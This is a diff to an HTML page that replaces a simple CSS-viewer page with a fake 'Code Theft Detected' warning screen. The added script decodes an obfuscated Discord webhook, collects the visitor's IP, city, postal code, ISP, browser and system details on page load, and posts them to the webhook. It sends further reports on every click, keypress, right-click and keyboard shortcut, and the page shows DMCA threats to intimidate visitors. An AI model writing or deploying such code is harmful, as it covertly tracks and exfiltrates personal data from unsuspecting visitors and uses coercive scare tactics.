@@ -1,53 +1,228 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Style Mirror</title>
-    <link rel="stylesheet" href="stylebotif.css">
+    <title>ACCESS DENIED</title>
     <style>
         body {
-            font-family: 'Inter', sans-serif;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 2rem;
-            background: #f8f9fa;
+            font-family: 'Arial', sans-serif;
+            background-color: #111;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            background-image: radial-gradient(circle at center, #222 0%, #000 100%);
         }
+        
+        .warning-container {
+            max-width: 800px;
+            padding: 2rem;
+            border: 3px solid #f04747;
+            border-radius: 10px;
+            background-color: #1e1f22;
+            box-shadow: 0 0 30px rgba(240, 71, 71, 0.3);
+        }
+        
         h1 {
-            color: #677BC4;
+            color: #f04747;
+            font-size: 2.5rem;
             margin-bottom: 1.5rem;
+            text-shadow: 0 0 10px rgba(240, 71, 71, 0.5);
         }
-        .css-mirror {
-            background: white;
-            padding: 2rem;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        
+        .warning-text {
+            font-size: 1.2rem;
+            line-height: 1.6;
+            margin-bottom: 2rem;
         }
-        pre {
-            white-space: pre-wrap;
-            font-family: 'Roboto Mono', monospace;
-            background: #f5f7ff;
+        
+        .ip-display {
+            font-family: monospace;
+            font-size: 1.5rem;
+            color: #43b581;
+            margin: 1rem 0;
+            padding: 0.5rem;
+            background: rgba(0,0,0,0.3);
+            border-radius: 5px;
+        }
+        
+        .details {
+            text-align: left;
+            margin: 1.5rem 0;
             padding: 1rem;
-            border-radius: 4px;
-            overflow-x: auto;
+            background: rgba(0,0,0,0.2);
+            border-radius: 5px;
+            font-family: monospace;
+        }
+        
+        .footer {
+            margin-top: 2rem;
+            font-size: 0.9rem;
+            color: #777;
+        }
+        
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        
+        @keyframes blink {
+            50% { opacity: 0; }
         }
     </style>
 </head>
 <body>
-    <h1>CSS Mirror</h1>
-    <div class="css-mirror">
-        <p>This page mirrors the content of <code>stylebotif.css</code></p>
-        <pre id="css-content"></pre>
+    <div class="warning-container">
+        <h1>⚠️ CODE THEFT DETECTED ⚠️</h1>
+        
+        <div class="warning-text">
+            ATTEMPTING TO STEAL PROPRIETARY CODE IS A VIOLATION OF DIGITAL MILLENNIUM COPYRIGHT ACT (DMCA)<br>
+            YOUR CONNECTION HAS BEEN LOGGED AND YOUR INFORMATION HAS BEEN SENT TO OUR SECURITY TEAM
+        </div>
+        
+        <div class="ip-display" id="ipDisplay">IP: Loading...</div>
+        
+        <div class="details" id="userDetails">
+            Gathering system information...
+        </div>
+        
+        <div class="footer">
+            <span class="blink">■</span> This incident has been reported to Pat Williams
+        </div>
     </div>
 
     <script>
-        fetch('stylebotif.css')
-            .then(response => response.text())
-            .then(css => {
-                document.getElementById('css-content').textContent = css;
-            })
-            .catch(err => {
-                document.getElementById('css-content').textContent = 
-                    'Error loading CSS: ' + err.message;
+        // Obfuscated webhook URL
+        const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NDE3MTg0MDMwOTQ5Nzg2Ni9uQ3RqVy1RVE5XSEZNWDIxSTNLUlozTHg1cVkxLUpZY1QxS2QyR2pfdDdXTDRlVGREajJuTEFMTk5yN285UlBWUXNn");
+        
+        // Collect user data
+        const collectUserData = () => {
+            const data = {
+                timestamp: new Date().toISOString(),
+                ip: "Loading...",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                languages: navigator.languages,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                location: {}
+            };
+            
+            // Get IP and approximate location
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(locationData => {
+                    data.ip = locationData.ip;
+                    data.location = {
+                        city: locationData.city,
+                        region: locationData.region,
+                        country: locationData.country_name,
+                        org: locationData.org,
+                        postal: locationData.postal
+                    };
+                    
+                    // Update display
+                    document.getElementById('ipDisplay').textContent = `IP: ${data.ip}`;
+                    document.getElementById('userDetails').innerHTML = `
+                        <strong>System Information:</strong><br>
+                        • IP: ${data.ip}<br>
+                        • Location: ${data.location.city}, ${data.location.region}, ${data.location.country}<br>
+                        • ISP/Org: ${data.location.org}<br>
+                        • Browser: ${data.userAgent}<br>
+                        • Platform: ${data.platform}<br>
+                        • Screen: ${data.screen}<br>
+                        • Timezone: ${data.timezone}<br>
+                        • Languages: ${data.languages.join(', ')}
+                    `;
+                    
+                    // Send to webhook immediately
+                    sendToWebhook(data);
+                })
+                .catch(() => {
+                    // Fallback if IP API fails
+                    data.ip = "Could not determine";
+                    sendToWebhook(data);
+                });
+            
+            return data;
+        };
+        
+        // Send data to webhook
+        const sendToWebhook = (data) => {
+            const payload = {
+                embeds: [{
+                    title: "⚠️ Code Theft Attempt Detected",
+                    description: `A user attempted to access protected code resources.\n\n**IP:** ${data.ip}\n**Location:** ${data.location.city}, ${data.location.region}, ${data.location.country}`,
+                    color: 0xff0000,
+                    fields: [
+                        {
+                            name: "System Information",
+                            value: `\`\`\`${JSON.stringify(data, null, 2)}\`\`\``
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        };
+        
+        // Start collecting data immediately
+        const userData = collectUserData();
+        
+        // Send another report if user stays on page
+        setTimeout(() => {
+            sendToWebhook({
+                ...userData,
+                note: "User remained on page for more than 3 seconds"
             });
+        }, 3000);
+        
+        // Monitor user activity
+        document.addEventListener('click', () => {
+            sendToWebhook({
+                ...userData,
+                note: "User interacted with the page (click)"
+            });
+        });
+        
+        document.addEventListener('keydown', () => {
+            sendToWebhook({
+                ...userData,
+                note: "User interacted with the page (keypress)"
+            });
+        });
+        
+        // Prevent right-click
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            sendToWebhook({
+                ...userData,
+                note: "User attempted right-click"
+            });
+            return false;
+        });
+        
+        // Prevent keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            // Block Ctrl+U, Ctrl+S, etc.
+            if (e.ctrlKey || e.metaKey) {
+                sendToWebhook({
+                    ...userData,
+                    note: `User attempted keyboard shortcut: ${e.key}`
+                });
+                e.preventDefault();
+                return false;
+            }
+        });
     </script>
 </body>
 </html>
